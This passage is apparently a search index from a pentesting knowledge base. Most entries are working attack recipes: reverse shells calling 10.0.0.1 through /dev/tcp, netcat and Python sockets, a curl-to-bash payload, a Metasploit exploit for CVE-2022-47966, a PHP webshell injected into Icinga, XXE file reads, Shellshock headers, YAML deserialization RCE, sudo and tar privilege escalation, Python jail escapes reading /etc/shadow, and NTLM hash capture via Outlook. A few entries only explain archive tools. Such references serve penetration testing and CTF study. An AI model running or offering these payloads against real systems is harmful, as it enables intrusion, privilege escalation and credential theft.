http://172.17.0.1 -v proxychains nmap 172.17.0.1 proxychains ssh @172.17.0.1 "
            }
        );
    index.add(
            {
                id:  171 ,
                href: "\/docs\/hdks\/windows\/privilege-escalation\/manageengine-adselfservice-plus\/",
                title: "ManageEngine ADSelfService Plus PrivEsc",
                description: "ADSelfService Plus is an integrated Active Directory Self-Service Password Management and Single Sign-on Solution that reduces password-related help desk calls. Default ports are 8888 (http) and 9251 (https).",
                content: "Directories link dir -Force \\Program Files (x86)\\ManageEngine\\ADSelfService Plus\\ Unauthenticated SAML RCE (CVE-2022-47966) linkReference: https://www.rapid7.com/db/modules/exploit/multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966/\nmsfconsole msf\u003e use exploit/multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966 msf\u003e set GUID 43ae36f51da65753530a64b37a510a53 msf\u003e set ISSUER_URL http://example.com/adfs/services/trust msf\u003e set RHOSTS msf\u003e set RPORT 9251 msf\u003e set LHOST msf\u003e set LPORT 4444 msf\u003e run meterpreter\u003e shell "
            }
        );
    index.add(
            {
                id:  172 ,
                href: "\/docs\/hdks\/linux\/privilege-escalation\/sssd-privilege-escalation\/",
                title: "SSSD Privilege Escalation",
                description: "SSSD (System Security Services Daemon) provides a set of daemons to manage access to remote directory services and authentication mechanisms.",
                content: "Find Credentials link ls -la /var/lib/sss/ # Find credentials # If we find the hash, crack it using John or Hashcat. strings /var/lib/sss/db/example.ldb "
            }
        );
    index.add(
            {
                id:  173 ,
                href: "\/docs\/hdks\/web\/icinga-web-pentesting\/",
                title: "Icinga Web Pentesting",
                description: "Remote Code Execution (CVE-2022-24715) linkAuthenticated user can execute arbitrary code. Automation linkThis repository is available for reverse shell automatically. In local machine, start a listener. nc -lvnp 4444 Next create a PEM file and download the script, then execute it. ssh-keygen -m pem # Location: cert.pem # Passphrase: (empty) wget https://github.com/JacobEbben/CVE-2022-24715/blob/main/exploit.py python3 exploit.py -t http://example.com/icingaweb2/ -I -P 4444 -u username -p password -e cert.pem Manual Exploitation link*This content may not be working due to not enough verification.",
                content: "Remote Code Execution (CVE-2022-24715) linkAuthenticated user can execute arbitrary code.\nAutomation linkThis repository is available for reverse shell automatically.\nIn local machine, start a listener.\nnc -lvnp 4444 Next create a PEM file and download the script, then execute it.\nssh-keygen -m pem # Location: cert.pem # Passphrase: (empty) wget https://github.com/JacobEbben/CVE-2022-24715/blob/main/exploit.py python3 exploit.py -t http://example.com/icingaweb2/ -I -P 4444 -u username -p password -e cert.pem Manual Exploitation link*This content may not be working due to not enough verification.\nPrepare Pem private key in local machine.\nssh-keygen -m pem # Location cert.pem # Passphrase: (empty) Login Icinga Web 2 and enter dashboard.\nGo to Configuration  Application  Resources.\nClick Create a New Resource.\nIn New Resource Window, select Resource Type SSH Identity.\nFill other field. For example,\n[Resource Name] evil [User] ../../../../../../../../../../../dev/shm/run.php [Private Key] \\x00\u003c?php system($_REQUEST[\"cmd\"]);?\u003e Regarding the Private Key field, copy the content of the PEM file weve generated and paste it, then followed by newline, \\x00 and PHP webshell code.\nClick Save Resource.\nArbitrary File Disclosure (CVE-2022-24716) linkUnauthenticated user can read arbitrary files.\nAssume the Icinga Webs root directory is /icingaweb2.\n/icingaweb2/lib/icinga/icinga-php-thirdparty/etc/icingaweb2/authentication.ini /icingaweb2/lib/icinga/icinga-php-thirdparty/etc/icingaweb2/config.ini /icingaweb2/lib/icinga/icinga-php-thirdparty/etc/icingaweb2/resources.ini /icingaweb2/lib/icinga/icinga-php-thirdparty/etc/icingaweb2/roles.ini /icingaweb2/lib/icinga/icinga-php-thirdparty/etc/passwd Also we can this script for automatically.\n"
            }
        );
    index.add(
            {
                id:  174 ,
                href: "\/docs\/hdks\/web\/cookie\/session-fixation\/",
                title: "Session Fixation",
                description: "Session fixation attacks attempt to exploit the vulnerability of a system that allows one person to fixate another persons session identifier.",
                content: "Exploitation link1. Attacker Logins Website to Get the Session linkAn attacker need to login to a legitimate website then get the session value.\nCookie: sessid=abcdef 2. Attacker Sends the Session Value to Victim linkThere are various way to send the attackers session value. For example,\nSend email.\nPredict a session value.\nEavesdrop a session using packet sniffer such as Wireshark.\nXSS\n3. Victim Logins with Attackers Session linkIf the victim logins and attackers session is set to the Cookie, the attacker can control the victims account in the website.\n"
            }
        );
    index.add(
            {
                id:  175 ,
                href: "\/docs\/hdks\/linux\/privilege-escalation\/python-eval-code-execution\/",
                title: "Python Eval Code Execution",
                description: "Python's eval() method is vulnerable to arbitrary code execution.",
                content: "Investigation link eval(text) eval(f\"5 + {num}\") If the Python script allows us to input some value to the text variable, we can inject arbitrary code.\nArbitrary Code Execution linkMost of the time, we need to bypass another expression to execute our desired command.\n__import__('os').system('id') ),__import__('os').system('id') '),__import__('os').system('id') },__import__('os').system('id') ),__import__('os').system('id')# Reverse Shell link __import__('os').system('bash -c \"bash -i \u003e\u0026 /dev/tcp/10.0.0.1/4444 0\u003e\u00261\"') "
            }
        );
    index.add(
            {
                id:  176 ,
                href: "\/docs\/hdks\/linux\/backup\/borgbackup-pentesting\/",
                title: "BorgBackup Pentesting",
                description: "A deduplicating backup program.",
                content: "Extract Archives link borg extract /path/to/archive:: Enter passphrase: "
            }
        );
    index.add(
            {
                id:  177 ,
                href: "\/docs\/hdks\/web\/security-risk\/php-filters-chain\/",
                title: "PHP Filters Chain",
                description: "Exploitation linkPHP Filter Chain Generator is available so we can use it. python3 php_filter_chain_generator.py --chain '\u003c?php phpinfo(); ?\u003e' We only have to do is paste the above generated payload to /?page=. Reverse Shell linkFirst create a shell script named revshell in local machine. bash -i \u003e\u0026 /dev/tcp/10.0.0.1/4444 0\u003e\u00261 Then create a chain using a generator. Replace the ip address with your own. # `\u003c?= ?\u003e` is a shorthand for `\u003c?php echo ~ ?",
                content: "Exploitation linkPHP Filter Chain Generator is available so we can use it.\npython3 php_filter_chain_generator.py --chain '\u003c?php phpinfo(); ?\u003e' We only have to do is paste the above generated payload to /?page=.\nReverse Shell linkFirst create a shell script named revshell in local machine.\nbash -i \u003e\u0026 /dev/tcp/10.0.0.1/4444 0\u003e\u00261 Then create a chain using a generator.\nReplace the ip address with your own.\n# `\u003c?= ?\u003e` is a shorthand for `\u003c?php echo ~ ?\u003e` python3 php_filter_chain_generator.py --chain '\u003c?= `curl -s -L 10.0.0.1/revshell|bash` ?\u003e' We need to start a web server that hosts the shell script, and also start a listener for receiving the reverse connection.\n# terminal 1 sudo python3 -m http.server 80 # terminal 2 nc -lvnp 4444 Now access to /?page=. We can get a shell.\n"
            }
        );
    index.add(
            {
                id:  178 ,
                href: "\/docs\/hdks\/web\/security-risk\/xxe\/",
                title: "XXE (XML External Entity)",
                description: "XXE is a type of attack against an application that parses XML input.",
                content: "Read Files link \u003c?xml version=\"1.0\"?\u003e \u003c!DOCTYPE root [\u003c!ENTITY xxe SYSTEM \"file:///etc/passwd\"\u003e]\u003e \u0026xxe; https://vulnerable.com/set?data=%3C%3Fxml%20version%3D%221.0%22%3F%3E%3C%21DOCTYPE%20root%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22%2Fetc%2Fpasswd%22%3E%5D%3E%3Cconfig%3E%3Clocation%3E%26xxe%3B%3C%2Flocation%3E%3C%2Fconfig%3E PHP Filter link \u003c?xml version=\"1.0\"?\u003e \u003c!DOCTYPE foo [\u003c!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\"\u003e]\u003e \u0026xxe; Remote Code Execution link \u003c?xml version=\"1.0\"?\u003e \u003c!DOCTYPE root [\u003c!ENTITY xxe SYSTEM \"expect://whoami\"\u003e]\u003e \u0026xxe; https://vulnerable.com/set?data=%3C%3Fxml%20version%3D%221.0%22%3F%3E%3C%21DOCTYPE%20root%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%5D%3E%3Cconfig%3E%3Clocation%3E%26xxe%3B%3C%2Flocation%3E%3C%2Fconfig%3E SSRF attack link \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003c!DOCTYPE foo [ \u003c!ENTITY xxe SYSTEM \"http://sub.vulnerable.com/admin\"\u003e ]\u003e \u0026xxe; 1 Also we can use the Blind XXE for exfiltrating data. Please refer to the Blind XXE page.\nXInclude link POST /product/stock HTTP/1.1 ... productId=\u003e\u0026storeId=1 File upload link \u003c?xml version=\"1.0\" standalone=\"yes\"?\u003e \u003c!DOCTYPE foo [ \u003c!ENTITY xxe SYSTEM \"file:///etc/hostname\" \u003e ]\u003e \u0026xxe; "
            }
        );
    index.add(
            {
                id:  179 ,
                href: "\/docs\/hdks\/web\/method\/web-vhost-enumeration\/",
                title: "Virtual Hosts (VHOSTS) Enumeration",
                description: "We can find virtual hosts for websites by enumerating Host header value.",
                content: "Enumeration link # Ffuf ffuf -u http://example.com/ -H \"Host: FUZZ.example.com\" -w wordlist.txt -fs 1234 # follow redirect (-r) ffuf -u http://example.com/ -H \"Host: FUZZ.example.com\" -w wordlist.txt -fs 1234 -r # Sometimes, we have to specify the ip address not domain. ffuf -u http://10.0.0.1/ -H \"Host: FUZZ.example.com\" -w wordlist.txt -fs 1234 # Wfuzz wfuzz -u http://example.com -H \"Host: FUZZ.example.com\" -w wordlist.txt --hl 138 If we found vhosts, add them to the /etc/hosts in our machine.\nRelated Domains linkIf we find the vhosts, we can try to search moreover with keywords.\nFor instance, assume we found sub domain.\nsub-api.example.com sub-dev.example.com sub-prod.example.com sub-mail.example.com sub-email.example.com api-sub.example.com dev-sub.example.com prod-sub.example.com mail-sub.example.com email-sub.example.com OSINT link nmmapper SAN (Subject Alternative Name) in the Certificate linkSAN is an extension to X.509 that allows various values to be associated with a security certificate using a subjectAltName field.\nWe can also check it for finding subdomains.\nReplace example.com with your target domain.\nopenssl s_client -connect example.com:443 \u003c /dev/null | openssl x509 -noout -text | grep -C3 -i dns "
            }
        );
    index.add(
            {
                id:  180 ,
                href: "\/docs\/hdks\/web\/security-risk\/wkhtmltopdf-ssrf\/",
                title: "wkhtmltopdf SSRF",
                description: "wkhtmltopdf is a command line tool to render HTML into PDF using Qt WebKit. It is vulnerable to SSRF.",
                content: "Exploitation linkCreate a PHP payload to read local file.\n\u003c?php header('location:file://'.$_REQUEST['x']); ?\u003e Then start web server in local machine.\nphp -S 0.0.0.0:8000 Send request to where wkhtmltopdf is affected. For example,\n/htmltopdf?item= Now we can see the system users list via a generated PDF.\n"
            }
        );
    index.add(
            {
                id:  181 ,
                href: "\/docs\/hdks\/web\/apache-zeppelin-pentesting\/",
                title: "Apache Zeppelin Pentesting",
                description: "Apache Zeppelin is a web-based notebook that enables data-driven. It uses 8080 port by default.",
                content: "Authentication Config File link /shiro.ini Default Credentials link admin:admin admin:password1 user1:password2 user1:role1 user1:role2 user2:password3 user2:role3 user3:password4 user3:role2 RCE in Notebooks linkWe can execute remote OS command in notebooks. Access to the notebook and execute the following scripts.\n%python import os # Configurations os.system('cat conf/shiro.ini') Reverse Shell linkBefore executing the following script, we need to start a listener such as nc -lvnp 4444 in local machine.\n%python import os,pty,socket;s=socket.socket();s.connect((\"10.0.0.1\", 4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"bash\") "
            }
        );
    index.add(
            {
                id:  182 ,
                href: "\/docs\/hdks\/linux\/privilege-escalation\/tar-wildcard-injection-privesc\/",
                title: "Tar Wildcard Injection PrivEsc",
                description: "Tar command with wildcard injection may lead to privilege escalation (PrivEsc).",
                content: "Investigation linkFor example, below command can be executed as root.\nsudo -l (root) NOPASSWD: /opt/backup/baskup.sh Check If the File Contains Tar Command with Wildcards linkWe need to check the content in the file.\ncat /opt/backup/backup.sh # -cf: create an archived file tar -cf backup.tar * The above tar command means that it creates an arvhived file from any input file because it passes wildcard (*).\nExploitation linkNow create a payload for privilege escalation.\ncd /opt/backup echo -e '#!/bin/bash\\n/bin/bash' \u003e shell.sh echo \"\" \u003e \"--checkpoint-action=exec=sh shell.sh\" echo \"\" \u003e --checkpoint=1 Weve created three files.\nls /opt/backup shell.sh '--checkpoint-action=exec=sh shell.sh' '--checkpoint=1' Now execute tar command as root with wildcard.\nsudo tar -cf example.tar * Wait until tar command will be executed.\nAfter a while, we should see the current user switch to root.\nwhoami root "
            }
        );
    index.add(
            {
                id:  183 ,
                href: "\/docs\/hdks\/web\/security-risk\/xss-with-dynamic-pdf\/",
                title: "XSS with Dynamic PDF",
                description: "If the PDF file, which is created somewhere in the website, that is reflected our payloads, we can insert malicious code.",
                content: "Basic link \"\u003eXSS Path Disclosure link LFI/RFI link LFI/RFI (XHR request) link Cookie Hijacking link External Scripts link "
            }
        );
    index.add(
            {
                id:  184 ,
                href: "\/docs\/hdks\/linux\/privilege-escalation\/ghidra-debug-mode-rce\/",
                title: "Ghidra Debug Mode RCE",
                description: "Exploitation link jdb -attach 127.0.0.1:18001 \u003e classpath \u003e classes Log4j2-TF-4-Scheduled-1[1] stop in org.apache.logging.log4j.core.util.WatchManager$WatchRunnable.run() Log4j2-TF-4-Scheduled-1[1] print new java.lang.Runtime().exec(\"nc 10.0.0.1 4444 -e /bin/sh\") ",
                content: "Exploitation link jdb -attach 127.0.0.1:18001 \u003e classpath \u003e classes Log4j2-TF-4-Scheduled-1[1] stop in org.apache.logging.log4j.core.util.WatchManager$WatchRunnable.run() Log4j2-TF-4-Scheduled-1[1] print new java.lang.Runtime().exec(\"nc 10.0.0.1 4444 -e /bin/sh\") "
            }
        );
    index.add(
            {
                id:  185 ,
                href: "\/docs\/hdks\/web\/limesurvey-pentesting\/",
                title: "LimeSurvey Pentesting",
                description: "LimeSurvey is a statistical servey web app written in PHP based on MySQL, SQLite, PostgreSQL or MSSQL database.",
                content: "Default Credentials link admin:password Remote Code Execution (RCE) version \u003c 3.16 linkReference: https://www.exploit-db.com/exploits/46634\n"
            }
        );
    index.add(
            {
                id:  186 ,
                href: "\/docs\/hdks\/web\/php-hash-hmac-bypass\/",
                title: "PHP hash_hmac Bypass",
                description: "Investigation linkIf the website uses hash_hmac function on PHP as below, we can bypass by injecting parameters. \u003c?php if (empty($_POST['hmac']) || empty($_POST['host']) { header('HTTP/1.0 400 Bad Request'); exit; } if (isset($_POST['nonce']) $secret = hash_hmac('sha256', $_POST['nonce'], $secret); $hmac = hash_hmac('sha256', $_POST['host'], $secret); if ($hmac !== $_POST['hmac']) { header('HTTP/1.0 403 Forbidden'); exit; } ?\u003e When executing the following command, the hash_hmac returns false. php -r \"echo hash_hmac('sha256', Array(), 'secret')==false;\" # Output PHP Warning: hash_hmac() expects parameter 2 to be string, array given in Command line code on line 1 1 Exploitation linkCreate a Hmac hash by running below.",
                content: "Investigation linkIf the website uses hash_hmac function on PHP as below, we can bypass by injecting parameters.\n\u003c?php if (empty($_POST['hmac']) || empty($_POST['host']) { header('HTTP/1.0 400 Bad Request'); exit; } if (isset($_POST['nonce']) $secret = hash_hmac('sha256', $_POST['nonce'], $secret); $hmac = hash_hmac('sha256', $_POST['host'], $secret); if ($hmac !== $_POST['hmac']) { header('HTTP/1.0 403 Forbidden'); exit; } ?\u003e When executing the following command, the hash_hmac returns false.\nphp -r \"echo hash_hmac('sha256', Array(), 'secret')==false;\" # Output PHP Warning: hash_hmac() expects parameter 2 to be string, array given in Command line code on line 1 1 Exploitation linkCreate a Hmac hash by running below.\nIn the above PHP script, $hmac needs to be the same as the parameter values of hmac.\nphp -r \"echo hash_hmac('sha256', 'example.com', false)\" # Output 8e35e0a8e5a18b6ef04598dff384c65adf5aced1a1d530b17f86e92eeb9372a8 So put the output hmac value into the paramter hmac and the second arguments (example.com) into the host parameter.\nhttps://example.com/?nonce[]=\u0026hmac=8e35e0a8e5a18b6ef04598dff384c65adf5aced1a1d530b17f86e92eeb9372a8\u0026host=example.com "
            }
        );
    index.add(
            {
                id:  187 ,
                href: "\/docs\/hdks\/web\/java-rmi-pentesting\/",
                title: "Java RMI Pentesting",
                description: "Java RMI (Java Remote Method Invocation) is a Java-based application programming interface (API) that enables developers to create distributed applications in which objects residing in one Java Virtual Machine (JVM) can invoke methods on objects residing in separate JVMs. It uses the port 1098, 1099.",
                content: "No content yet.\n"
            }
        );
    index.add(
            {
                id:  188 ,
                href: "\/docs\/hdks\/web\/jboss-pentesting\/",
                title: "JBOSS Pentesting",
                description: "JBOSS AS (Application Server), also known as WildFly, is an application server which is written in Java.",
                content: "Enumeration link msfconsole msf \u003e use auxiliary/scanner/http/jboss_vulnscan Common Directories link /admin-console/ /invoker/JMXInvokerServlet /jbossws/ /jmx-console/ /jmx-console/HtmlAdaptor /management /manager /status?full=true /web-console/ /web-console/Invoker /web-console/ServerInfo.jsp Default Credentials link admin:admin Exploitation linkJexBoss is available as an exploitation CLI tool.\ngit clone https://github.com/joaomatosf/jexboss.git cd jexboss pip3 install -r requirements.txt python3 jexboss.py -host https://example.com:8080 # Reverse Shell Shell\u003e /bin/bash -i \u003e /dev/tcp/10.0.0.1/4444 0\u003e\u00261 2\u003e\u00261 "
            }
        );
    index.add(
            {
                id:  189 ,
                href: "\/docs\/hdks\/linux\/privilege-escalation\/python-privilege-escalation\/",
                title: "Python Privilege Escalation",
                description: "Python binary is vulnerable to privilege escalation in some situations.",
                content: "Sudo PrivEsc linkReplace with Arbitrary Script link sudo -l (root) NOPASSWD: /usr/bin/python3 /home//example.py If the python script is under the current users home directory, we can remove the script and create the new one with the same name.\nrm -rf /home//example.py touch /home//example.py We can insert arbitrary code in the new script. For example,\nimport os;os.system('/bin/bash') Module Hijacking linkAssume the python script can be executed as root with SETENV,NOPASSWD.\nFor example,\nsudo -l (root) SETENV: NOPASSWD: /usr/bin/python3 /opt/example.py With SETENV, we can change PYTHONPATH when executing the script, and insert malicious script to the module which is imported in the script.\nFirst off, check what module is imported in the python script (e.g. /opt/example.py here).\nimport random print(random.randint(1, 8)) We can forge the imported module.\nvim /tmp/random.py The content of the module is below. This is a script that executes reverse shell.\nReplace with your local ip address.\nimport socket,os,pty;s=socket.socket();s.connect((\"\",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"bash\") After that, in another local terminal, start listener for getting a shell.\nnc -lvnp 4444 Then run the python script with updating PYTHONPATH in the remote machine.\nsudo PYTHONPATH=/tmp/ /usr/bin/python3 /opt/example.py By setting PYTHONPATH=/tmp/, the python script will import modules from /tmp/ directories so the random module is imported from /tmp/random.py.\nFinally, we should get a shell in local terminal.\nModule Overriding linkIf the Python script contains a module that can be modified by current user, we can inject arbitrary code into the module.\nFirst, check what modules the Python script uses.\n# example.py import random Assume the random module is used in the script.\nFind the path of the module and check if its writable.\nfind / -name \"random.py\" 2\u003e/dev/null ls -al /usr/lib/python3.6/random.py If we know we can modify it, inject arbitrary code in this module.\nAssume the random module path is /usr/lib/python3.6/random.py.\n# /usr/lib/python3.6/random.py import os;os.sytem('/bin/bash') Then execute the Python script and we can spawn the root shell.\nOS Commands in input() linkIf you find the executable which is created in Python.\nFor instance,\n./executable Enter some input: You can enter OS commands in some input.\n__import__('os').system('id') For example,\n./executable Enter some input: __import__('os').system('id') IPython Privilege Escalation (CVE-2022-21699) linkInterective Python (IPython) is a command shell for interective computing in multiple programming languages.\n# -m: file mode (rwx) mkdir -m 777 /tmp/profile_default mkdir -m 777 /tmp/profile_default/startup echo 'print(\"stealing your private secrets\")' \u003e /tmp/profile_default/startup/exploit.py "
            }
        );
    index.add(
            {
                id:  190 ,
                href: "\/docs\/hdks\/linux\/privilege-escalation\/sudo\/sudoedit-privilege-escalation\/",
                title: "Sudoedit Privilege Escalation",
                description: "Sudoedit is vulnerable to privilege escalation.",
                content: "Investigation link sudo -l (root) sudoedit /opt/example.txt If we can execute sudoedit command as root, we might be able to escalate the privileges with some version.\nExploitation (CVE-2023-22809) link export EDITOR=\"vim -- /etc/sudoers\" sudoedit /opt/example.txt In vim editor, add the following line in /etc/sudoers.\nAssume the current username is john\njohn ALL=(ALL:ALL) ALL After that, we can escalate to root privilege.\nsudo su root "
            }
        );
    index.add(
            {
                id:  191 ,
                href: "\/docs\/hdks\/linux\/archive\/7z\/",
                title: "7z",
                description: "The 7z command is a compression utility that is used to compress and decompress files in Unix, Linux, and other operating systems.",
                content: "Compress link # a: Add files to archive 7z a example.zip example.txt # With password 7z a example.zip example.txt -p password Decompress link # e: Extract files from archive 7z e example.zip # With password 7z e example.zip -p password "
            }
        );
    index.add(
            {
                id:  192 ,
                href: "\/docs\/hdks\/linux\/archive\/bzip-bunzip\/",
                title: "Bzip2 \u0026 Bunzip2",
                description: "Bzip2 command is a compression utility in Unix, Linux and other operating systems. It is used to compress and decompress files to reduce their size.",
                content: "Compress link bzip2 example.txt Decompress link bzip2 -d example.txt.bz2 bunzip2 example.txt.bz2 "
            }
        );
    index.add(
            {
                id:  193 ,
                href: "\/docs\/hdks\/web\/cgi-pentesting\/",
                title: "CGI Pentesting",
                description: "CGI (Common Gateway Interface) is a standard protocol that enables web servers to interact with external programs, typically to generate dynamic web content or handle web form submissions. If there is /cgi-bin/ directory in the website, we may be able to execute arbitrary OS command.",
                content: "Enumeration CGI Scripts link ffuf -u https://example.com/cgi-bin/FUZZ.cgi -w wordlist.txt Shellshock linkShellshock is the vulnerability of bash v1.0.3-4.3 that allows users to execute arbitrary commands. If we found the CGI script under /cgi-bin/, modifying HTTP header to remote code execution.\nGET /cgi-bin/example.cgi HTTP/1.1 User-Agent: () { :; }; /bin/bash -c \"sleep 5\" Cookie: () { :; }; /bin/bash -c \"sleep 5\" # Reverse Shell User-Agent: () { :; }; /bin/bash -c \"bash -i \u003e\u0026 /dev/tcp/10.0.0.1/4444 0\u003e\u00261\" "
            }
        );
    index.add(
            {
                id:  194 ,
                href: "\/docs\/hdks\/linux\/archive\/gzip-gunzip\/",
                title: "Gzip \u0026 Gunzip",
                description: "Gzip command is a utility that is used to compress and decompress files to reduce their size. The name \"gzip\" stands for \"GNU zip\".",
                content: "Compress link gzip example.txt Decompress link gzip -d example.txt.gz gunzip example.txt.gz "
            }
        );
    index.add(
            {
                id:  195 ,
                href: "\/docs\/hdks\/linux\/privilege-escalation\/irb-privilege-escalation\/",
                title: "irb (Interactive Ruby Shell) Privilege Escalation",
                description: "Exploitation link irb # #q!: Define a string literal \u003e exec %q!whoami! \u003e exec %q!cp /bin/bash /tmp/bash; chmod +s /tmp/bash! \u003e exec %q!bash -c \"bash -i \u003e\u0026 /dev/tcp/10.0.0.1/4444 0\u003e\u00261\"! ",
                content: "Exploitation link irb # #q!: Define a string literal \u003e exec %q!whoami! \u003e exec %q!cp /bin/bash /tmp/bash; chmod +s /tmp/bash! \u003e exec %q!bash -c \"bash -i \u003e\u0026 /dev/tcp/10.0.0.1/4444 0\u003e\u00261\"! "
            }
        );
    index.add(
            {
                id:  196 ,
                href: "\/docs\/hdks\/windows\/privilege-escalation\/outlook-reminder-privilege-escalation\/",
                title: "Outlook Reminder Privilege Escalation",
                description: "The Outlooks Reminder method is vulnerable to privilege escalation by abusing the UNC (Universal Naming Convention) file path of the reminder sound. CVE-2023-23397.",
                content: "Exploitation linkTo carry out this attack, the OutlookSpy is required. So please install it before proceeding.\n1. Start Responder linkFirst off, start responder in our local machine to capture NetNTLM authentication.\n# -I: Interface (eth0, tun0, etc.) responder -I tun0 2. Modify Reminder Settings using OutlookSpy link In Outlook, select Home tab and click New Items then choose Appointment in drawer menu.\nIn new Appointment window, select OutlookSpy tab then click CurrentItem. The AppointmentItem window will open.\nIn AppointmentItem window, click Script tab and input the following value.\nReplace 10.0.0.1 with your local server ip.\nAppointmentItem.ReminderOverrideDefault = true AppointmentItem.ReminderPlaySound = true AppointmentItem.ReminderSoundFile =\"\\\\10.0.0.1\\test.wav\" After that, click Run button to apply the new properties.\nTo confirm if the properties applied, click Properties tab and choose the following items in left pane.\nReminderOverrideDefault ReminderPlaySound ReminderSoundFile Close the AppointmentItem window.\n3. Attach New Appointment link Click Appointment tab and click Reminder in the Options section. Then set 0 minutes. Fill the Subject, Location and Message with arbitrary values. To send the appointment to the victim address, click Forward in Actions section in Appointment tab. Then enter the victim email address as a destination. Now click Send button. 4. Capture the Victims NTLMv2 Hash with Responder link Because we set the reminder with 0 minutes, we should see the reminder popup immediately after saving. In our terminal, responder, that weve launched, captured the NTLMv2 hash. "
            }
        );
    index.add(
            {
                id:  197 ,
                href: "\/docs\/hdks\/linux\/privilege-escalation\/ruby-privilege-escalation\/",
                title: "Ruby Privilege Escalation",
                description: "Ruby is an interpreted, high-level, general-purpose programming language.",
                content: "Remote Code Execution with YAML linkCheck if the current user could run the ruby script as root privilege.\n(root) NOPASSWD: /usr/bin/ruby sample.rb If the sample.rb contains the File.read(sample.yml), modify the YAML file as follow:\n--- - !ruby/object:Gem::Installer i: x - !ruby/object:Gem::SpecFetcher i: y - !ruby/object:Gem::Requirement requirements: !ruby/object:Gem::Package::TarReader io: \u00261 !ruby/object:Net::BufferedIO io: \u00261 !ruby/object:Gem::Package::TarReader::Entry read: 0 header: \"abc\" debug_output: \u00261 !ruby/object:Net::WriteAdapter socket: \u00261 !ruby/object:Gem::RequestSet sets: !ruby/object:Net::WriteAdapter socket: !ruby/module 'Kernel' method_id: :system git_set: \"bash -c 'bash -i \u003e\u0026 /dev/tcp// 0\u003e\u00261'\" method_id: :resolve Then start listener in local machine.\nnc -lvnp Now run the sudo command.\nsudo /usr/bin/ruby sample.rb "
            }
        );
    index.add(
            {
                id:  198 ,
                href: "\/docs\/hdks\/linux\/archive\/tar\/",
                title: "Tar",
                description: "Tar command is a utility that is used to create, manipulate, and extract archived files. \"tar\" stands for \"tape archive\".",
                content: "Archive Files link # -c: Create a new archive # -f: Use archive file tar -cf archive.tar example.txt tar -cf archive.tar example1.txt example2.txt # -z: filter the archive through gzip tar -zcf example.tar.gz example/ Extract Files link # -x: Extract files from an archive # -f: Use archive file tar -xf archive.tar tar -xf archive.tar.gz # output given directory tar -xf archive.tar --directory archived Display Contents without Extracting link tar -tf archive.tar "
            }
        );
    index.add(
            {
                id:  199 ,
                href: "\/docs\/hdks\/web\/template-engine\/jsrender-template-injection\/",
                title: "JsRender Template Injection",
                description: "JsRender is a light-weight but powerful template engine. It is vulnerable to template injection.",
                content: "Investigation linkTry to insert arbitrary code into double curly brackets. If the result of the code is reflected in the page, we can inject malicious code in the template.\n{{:2*3}} {{:\"test\".toString}} Exploitation link # XSS {{:\"test\".toString.constructor.call({},\"alert(1)\")}} # Read local files {{:\"test\".toString.constructor.call({},\"return global.process.mainModule.constructor._load('child_process').execSync('cat /etc/passwd').toString()\")()}} "
            }
        );
    index.add(
            {
                id:  200 ,
                href: "\/docs\/hdks\/linux\/privilege-escalation\/python-jails-escape\/",
                title: "Python Jails Escape",
                description: "If we faced the Python script as follow, we cannot use common modules used for escalating privileges (os, system, etc.). It appeared in Newbie CTF 2019. #! /usr/bin/python3 def main(): text = input('\u003e\u003e ') for keyword in ['eval', 'exec', 'import', 'open', 'os', 'read', 'system', 'write']: if keyword in text: print(\"No!!!\") return else: exec(text) if __name__ == \"__main__\": main() We need to modify module names to allow us to execute them.",
                content: "If we faced the Python script as follow, we cannot use common modules used for escalating privileges (os, system, etc.).\nIt appeared in Newbie CTF 2019.\n#! /usr/bin/python3 def main(): text = input('\u003e\u003e ') for keyword in ['eval', 'exec', 'import', 'open', 'os', 'read', 'system', 'write']: if keyword in text: print(\"No!!!\") return else: exec(text) if __name__ == \"__main__\": main() We need to modify module names to allow us to execute them.\nThis post explains in details.\nPayloads link print(globals()) print(getattr(getattr(globals()['__builtins__'], '__im'+'port__')('o'+'s'), 'sys'+'tem')('cat /etc/shadow')) __builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('cat /etc/shadow') Payloads (input) linkIf the eval or exec modules are accepted, we can input arbitrary code.\neval(input()) # or exec(input()) \u003e print(open(\"/etc/passwd\", \"r\").read()) "
            }
        );
    index.add(
            {
                id:  201 ,
                href: "\/docs\/hdks\/linux\/privilege-escalation\/python-yaml-privilege-escalation\/",
                title: "Python Yaml Privilege Escalation",
                description: "Python Yaml package is vulnerable to execute arbitrary command.",
                content: "Investigation link import yaml filename = \"example.yml\" yaml.load() Payloads link import yaml from yaml import Loader, UnsafeLoader data = b'!!python/object/new:os.system [\"cp `which bash` /tmp/bash;chown root /tmp/bash;chmod u+sx /tmp/bash\"]' yaml.load(data) yaml.load(data, Loader=Loader) yaml.load(data, Loader=UnsafeLoader) yaml.load_all(data) yaml.load_all(data, Loader=Loader) yaml.load_all(data, Loader=UnsafeLoader) yaml.unsafe_load(data) Now execute the bash in privilege mode.\n/tmp/bash -p Reverse Shell linkStart a listener in local machine.\nnc -lvnp 1234 Then execute Python script that contains the following YAML code as root.\nimport yaml yaml.load('!!python/object/new:os.system ['bash -c \"bash -i \u003e\u0026 /dev/tcp/10.0.0.1/1234 0\u003e\u00261\"']) Base64 Encoding linkSometimes we might be able to remote code execution by using Base64 encoded payload.\nyaml.load(b64decode(b\"ISFweXRa...YXNoIl0=\")) "
            }
        );
    index.add(
            {
                id:  202 ,
                href: "\/docs\/hdks\/windows\/forensics\/windows-xml-eventlog\/",
                title: "Windows XML EventLog (EVTX)",
                description: "EVTX is used for Microsoft Windows to store system log information.",
